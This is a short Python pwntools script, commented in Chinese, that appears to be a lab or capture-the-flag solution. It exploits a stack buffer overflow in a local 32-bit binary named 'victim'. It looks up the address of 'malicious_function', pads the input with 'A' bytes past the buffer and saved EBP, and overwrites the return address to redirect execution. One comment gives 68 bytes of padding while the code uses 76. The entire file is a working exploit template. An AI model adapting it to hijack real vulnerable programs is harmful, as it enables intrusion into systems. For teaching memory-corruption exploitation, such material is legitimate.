#!/usr/bin/env python3
from pwn import context, ELF, process, p32

# 配置
context(arch="i386", os="linux")  # 32位架构
binary_path = "./victim"


# 获取恶意函数地址
def get_malicious_addr():
    # 使用ELF加载二进制文件
    elf = ELF(binary_path)
    return elf.symbols["malicious_function"]


# 构造恶意输入
def create_payload():
    # 获取恶意函数地址
    malicious_addr = get_malicious_addr()
    print(f"恶意函数地址: {hex(malicious_addr)}")

    # 计算填充长度 (buffer + saved ebp)
    # 通常buffer(64) + saved ebp(4) = 68
    # 但可能需要根据实际情况调整
    padding_length = 0x48 + 0x4

    # 构造payload: 填充字符 + 恶意地址
    payload = b"A" * padding_length
    payload += p32(malicious_addr)  # 小端格式

    return payload


# 执行攻击
def exploit():
    payload = create_payload()

    # 启动受害程序
    p = process(binary_path)

    # 发送payload
    p.sendline(payload)

    # 获取输出
    print(p.recvall().decode("utf-8", errors="ignore"))


if __name__ == "__main__":
    exploit()
